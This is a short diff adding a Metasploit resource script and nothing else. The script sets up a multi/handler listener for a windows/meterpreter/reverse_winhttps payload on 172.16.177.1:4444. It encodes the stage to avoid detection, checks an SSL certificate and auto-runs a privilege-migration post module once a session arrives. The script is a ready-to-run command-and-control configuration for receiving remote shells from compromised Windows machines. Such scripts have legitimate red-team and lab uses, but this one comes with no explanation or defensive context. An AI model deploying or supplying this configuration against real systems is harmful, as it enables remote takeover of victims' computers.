@@ -1,0 +1,11 @@
+use exploit/multi/handler
+set EnableStageEncoding true
+set StageEncoder x86/fnstenv_mov
+
+set payload windows/meterpreter/reverse_winhttps
+set HandlerSSLCert /shm/cert.pem
+set StagerVerifySSLCert true
+set LHOST 172.16.177.1
+set LPORT 4444
+set autorunscript post/windows/manage/priv_migrate
+exploit
